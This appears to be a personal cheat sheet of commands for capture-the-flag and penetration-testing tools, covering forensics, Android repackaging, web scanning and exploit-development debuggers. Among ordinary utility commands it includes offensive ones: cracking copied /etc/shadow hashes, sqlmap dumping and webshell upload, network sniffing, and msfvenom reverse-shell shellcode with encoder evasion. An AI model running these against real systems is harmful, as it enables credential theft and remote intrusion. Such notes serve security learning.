# Forensics
## OCR
* `tesseract` OCR, simple command line OCR tool
```bash
tesseract INPUT.png OUTPUT_FILE
```

## PDF to Image Conversion
* Convert `PDFs` to `ppms`
```bash
pdftoppm main.pdf outputname -png
```

* Convert `PNG` to `PDF`
```bash
convert *.png output.pdf
```

## PDF to text
```bash
pdftotext INPUT OUTPUT
```

## PNG recovery tool `PCRT`
* A very cool [tool](https://github.com/sherlly/PCRT) for recovering / extracting PNG file from a corrupted file.
```bash
python2 PCRT.py -v -f input.png
```

## xxd
* Make a `hexdump` of a file, `-p`  means in plain `hexdump` no addresses, `-r` means revert from `hexdump` to binary, `-c{i}` means print `i` amount of column to print out, where each column is one byte
* To reverse the entire hex value of a file
```bash
xdd -p -c1 file.png | tac | xdd -r -p file_rev.png
```
## BZCAT
* `bzcat` allow you to see the content of a `bz` zipped file without the need to uncompress it
```bash
bzcat file.bz2
```

## zipdetails
* `zipdetails` allows you to see the details of a zip, pretty straight forward and useful.
```bash
zipdetails file
```

## Showmount
* `showmount` is used to see which part of the server are mountable to the outside world
```bash
showmount -e 192.168.1.1
```
## pdfunite
* Combine or concatenate PDFs! cool!
```bash
pdfunite 1.pdf 2.pdf out.pdf
```

## zsteg
* User `zsteg` to extract `zlib` Compression
```bash
zsteg a.png
```


# Misc
## John-the-ripper
* Usage
```bash
john --format=Raw-MD5 database_password.txt
```
* Remove cached password
```bash
cd .john/ && rm john.pot
```
* Sample run
```bash
sudo cp etc/passwd etc/shadow ~
cd
sudo unshadow passwd shadow > unshadow
john unshadow
```

## Figlet!
* Centering with `-c`
```bash
figlet -c test
```

* Specifying font with `-f`
```bash
figlet -f script/shadow/slant
```
## screen
* Use `^A to start screen commands`, `^A ?` for help
```bash
^A ?    help
^A S    split
^A |    vertical split
^A tab  switch screen
^A d    detach
^A k    kill the current screen session
^A Q    only that screen
^A C    Create a new screen
```

## script
* Awesome tool for recording terminal session!!! Opens a new session for recording, need to exit to save. File saved as `typescript`
```bash
script
```

## Maximum efficiency grep! 
* MAX EFFICIENT GREP USAGE HERE! Use `ls` to generate a list of directory which is then passed into `xargs` , `-P 0` means maximum concurrent threads, and then suppresses error message to `/dev/null`, `-I folder` means replace all inputs for `xargs` to be `folder`, like setting a variable name
```bash
ls | xargs -P 0 -I folder grep -ri flag folder 2> /dev/null | grep flag{.*}
```

## rdesktop
* Remote connect to a machine with GUI control, `-u` indicate username, `-p` for password, `-g` for geometry, `-x` for experience, 
```bash
rdesktop 127.0.0.1 -u USER -p PASS -g 1366x864 -x 0x80
```
List of experiences
```
0x00 = DISABLE_NOTHING    
0x01 = NO_WALLPAPER   
0x02 = NO_FULLWINDOWDRAG  
0x04 = NO_MENUANIMATIONS  
0x08 = NO_THEMING     
0x20 = NO_CURSOR_SHADOW   
0x40 = NO_CURSORSETTINGS    /* disables cursor blinking */  
0x80 = ENABLE_FONT_SMOOTHING 

## We can add above settings to create `new` experiences
0x8F   # equals the modem default + font smoothing
0x81   # equals the broadband default + font smoothing
```

## Creating a simple HTTP server
* We can create a simple HTTP server with `python`, will host any file on the current path.
```bash
python2
python -m SimpleHTTPServer 1337

python3
python3 -m http.server 1337
```

* We can do the same with `php`
```bash
php -S 0.0.0.0:1337
```

* With `ruby`, `-run` to load `un.rb` which contains replacements for common Unix commands, `-e httpd` to run http server, `.` to serve content from current directory, `-p` for port number. 
```bash
ruby -run -e httpd . -p 1337
```

# Android debugging
## apktool
* Recompile `apk` files
```bash
apktool d APP.apk
apktool b APP/ -o newAPP.apk
```

### keytool
* Use `keytool` to generate a public and private key pair, the `my-release-key.keystore` can store multiple keys, each identified by the alias name, which we will use later when signing the app
```bash
keytool -alias KEY_ALIAS -genkey -v -keystore my-release-key.keystore -keyalg RSA -keysize 2048 -validity 10000
```

* Use `jarsigner` to sign the new `APK` file with the key generated with `keytool`
```bash
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore newAPP.apk KEY_ALIAS
```

## adb
* Install an app
```bash
adb install APP.apk
```

* Use logcat to see log message of a particular app
```bash
adb logcat | grep -F "`adb shell ps | grep APP_NAME  | tr -s [:space:] ' ' | cut -d' ' -f2`""`'`"
```



# OSINT

## Sherlock
* Sherlock is a tool that finds social media accounts by username, very handy!
```bash
python3 sherlock.py username1
python3 sherlock.py username1 username2
```

# Web Tools
## Burp Suite

* Create proxy: `Option` -> Add `127.0.0.1:8080`
* Generate `CA` certificate to allow HTTPS interception:
1. Click `Regenerate CA certificate`
2. Go to `http://burp`, then download the `CA certificate`
3. Drag the file to a new tab, and click `Trust the certificate`

### FoxyProxy Basic 
* A Firefox proxy manager, 
* Click on icon -> `Options` -> `Add` -> 
## Bettercap
* Probe the network first and then see the list of connected host
```bash
net.probe on
net.show
```

* Setting up and running sniffer
```bash
set net.sniff.verbose true
set net.sniff.output ~/bettercap_sniff.pcap
net.sniff on
```
## axel
* command line download accelerator!! `-n` specifies number of multiple connections, `-a` gives a better progress bar. Make sure that the output file does not exist, or will get a state file not exist error!
```bash
axel -a -n 20 -o output https://google.com
```

## cutycapt
* An awesome tool that takes a screenshot of a given URL!!!
```bash
cutycapt --url=http://www.example.org/ --out=localfile.png
```
## nmap 
* `nmap` tells us exactly which version of services are running on the target server
```bash
nmap -A 192.168.1.1
```
* `-p-` scans all ports, `-sV` scans for version, `-T4` for fast execution
```bash
nmap -p- -sV -T4 192.168.1.1
```

## dirsearch
* Command line dirbuster!!! Awesome
```bash
python3 dirsearch -u URL -E
```

* Directory Listing with `dirb`. `-r` performs non-recursive queries, `-z 10` adds `10ms` delay between each request 
```bash
dirb http://127.0.0.1 -r -z 10
```

## httpie
* I did not think that there exist such tool that make http request looks so simple and pretty!
* It will default to GET / POST if you provide any data! VERY easy to use, note that if you want to send special character in POST, write it to a `JSON` file and pass it in stead of `cmd`
```bash
http URL
http URL hello=world
http URL Cookie:hello=world
http URL < request.json # passes in json request 
http URL < request.json # passes in json request 
```

## jq
* A command line JSON processor! can combine with `http`
```bash
jq .dependencies package.json
http URL | jq .dependencies
```

## sqlmap
* `-u` specifies a target URL,  `-p` for parameters
```bash
sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id"
```

* `--dbms=mysql` set the backend database to `mysql`,  `--dump` to dump the content for all tables. `sqlmap` cannot distinguish between `MariaDB` and `mysql`, so we can set them as the same
```bash
sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --dump
```

* We can get a shell by using `--os-shell`, and it will upload a webshell to server like what I did earlier automatically!
```bash
sqlmap -u http://127.0.0.1/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```

## Wireshark
| Field Name | Description |
|:-----:|:------:|
| `ip.addr` | Source or Destination Address (IPV4)|
| `ip.src` | Source IPv4 address|
| `ip.src_host` | Source Host name (ASCII)|
| `ip.host` |Source or Destination Host (ASCII) |

## TCPView
* Microsoft `TCPView` is a Windows Sysinternal tool that is able to show which process is using which port. kind of like `netstat`. `Ctrl + R` to disable resolving addresses for easier view.


## fingerprintjs2
[`fingerprintjs2`](https://github.com/fingerprintjs/fingerprintjs2) is a tool that uses `javascript` library that fingerprints client browser and underlying OS.

# Pwn
## Immunity Debugger
* To search for a constant string:
    * right click the assembly code pane
    * `Search for` -> `All referenced text strings`

`LEAVE` assembly instruction place the return address on to the top of the stack, and `RETN` pops the top of the stack and jump to it.

| Shortcut | Description |
|:-----:|:------:|
| `F2` | Set a break point|
| `F3` | Open a file|
| `F7` | Steps into a function|
| `F8` | Step over an instruction|
| `F9` | Run a program|
| `Ctrl + F9` | Execute until the end of return, allow us to see the result of the function call|
| `Ctrl + F1` | Attach a running process|

* `Immunity` uses `mona.py` script. `modules` shows all information about the `DLL`s that are loaded by current program in the process memory space. This is similar to `gdb`'s `vmmap`. Make sure the address don't contain have any bad characters and they are static, meaning No `ASLR`.
```
!mona modules
```

* Search for a specific Opcode sequence with `mona find -s` within a `DLL`(module) with `-m` flag
```
!mona find -s "\xff\xe4" -m "a.dll"
```

### Endianess
We have to put our payload address in reverse order. The OS can store addresses and data in memory in Little or Big Endian. In little Endian format, the low order byte of the number is stored in the memory at the lowest address, and the high order byte at the highest address. Therefore, we have to construct the payload address in reverse order because we are overwriting the return address from the opposite direction.

## `edb`
Evan's debugger, `edb`, is another useful debugger in Linux.
| Shortcut | Description |
|:-----:|:------:|
| `F7` | Steps into a function|
| `F9` | Run a program|
| `Alt + x` | Quit |
| `Alt + F, A` | Attach a program |
| `Ctrl + B` | Breakpoint manager |
| `Ctrl + O` | Opcode search |

## Cyclic
* Generate a pattern of length `800` characters
```
cyclic 800
```

* To look up pattern `haau` in previously generated pattern, make sure it is in the correct endianess, value show in `eip` is flipped due to sending via a network channel, try both endianess when searching and make an educated guess as to which one is more correct as it will be closer to the target payload length.
```
cyclic -l uaah
```
* Or we can use this... (the pure hex value)
```
cyclic -l 0x68616175
```

## `msf-nasm_shell`
`nasm`, the Netwide Assembler, is an assembler and disassembler for Intel x86 architecture. We can `msf-nasm_shell` use to find a corresponding Assembly Opcodes for a target Assembly code.
```
nasm> nop
00000000 90
nasm> jmp esp
00000000 FFE4
```

## msfvenom
`msfvenom` is a Metasploit framework that generates shell code payload.
* `-p` specifies the payload module, inside `/usr/share/metasploit-framework/modules/`, `LHOST` indicates Local HOST (our own machine) to connect to for reverse shell, and `LPORT` specifies the TCP port that we are listening on, `-fc` is the shellcode `format` in `c`
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc
```

### `shikata_ga_nai` Encoder!
* We can generate shellcode! but... it contains bad characters. BUT, we can use `-e`, specifies encoder to `shikata_ga_nai` to encode our shellcode! `-b` for set of bad characters
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -fc -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Note that we are constructing a encoded shellcode using `shikata_ga_nai`, which means that our shellcode is not directly executable and is prepended with a decoder stub. The job of this decoder stub is to iterate over the encoded shellcode and decode it. To accomplish this, the decoder stub needs to gather its own address in memory, and also look ahead to locate the encoded shellcode. The code will perform a series of assembly instructions to get its address in memory, which is also called `GetPC` routine. `GetPC` is a short routine that moves the value of `EIP`, aka `PC` or program counter, into another register. 

Unfortunately, `shikata_ga_nai` decoder has a side effect that will modify the values at or around the top of the stack, this means that we cannot directly insert our payload right after offset. One solution is that we can move the encoded shellcode further back in our buffer (~20 bytes) and padded the gap with `0x90` (`NOP SLED`).


